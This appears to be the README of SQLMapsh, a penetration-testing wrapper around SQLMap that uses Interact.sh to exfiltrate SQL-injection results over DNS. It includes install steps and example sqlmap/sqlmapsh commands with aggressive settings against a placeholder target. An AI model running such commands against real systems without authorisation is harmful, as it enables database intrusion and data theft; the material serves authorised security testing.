![SQLMap.sh](./pics/sqlmapsh.png)


SQLMap.sh is a SQLMap wrapper that lets you use Interact.sh as a DNS server for exfiltrating data with zero configuration.

To use the SQLMap `--dns-domain` flag you need to open your port 53 to the internet to let it run its own DNS server and you need a properly configured domain. This is not always possible during a penetration test engagement or maybe you just don't want to buy a domain for this.

SQLMap.sh solves this problem transparently. Just use it as if it is SQLMap and your are done to exfiltrate data via DNS.

## Installation

Run the following command to install the latest version.

```sh
go install github.com/unlock-security/sqlmapsh@latest
```

## Usage

Just replace `sqlmap` with `sudo sqlmapsh` when you want to use SQLMap with data exfiltration via DNS.

> [!IMPORTANT]
> SQLMap requires root privileges to perform data exfiltration via DNS because it needs to bind it's own DNS server locally on port 53

For example:

```sh
$ sqlmap -u 'https://www.target.com/page=1' -p page --level=5 --risk=3 --technique=E --banner
```

Become:

```sh
$ sudo sqlmapsh -u 'https://www.target.com/page=1' -p page --level=5 --risk=3 --technique=E --banner
```

---

<p align="center">Made with 💙 by Unlock Security</p>
<p align="center">
  <a href="https://www.unlock-security.it/?utm_source=github&utm_medium=repo&utm_campaign=wshell" target="_blank" rel="noopener">
    <img src="https://www.unlock-security.it/wp-content/uploads/2022/12/logo.svg" width="150">
  </a>
</p>
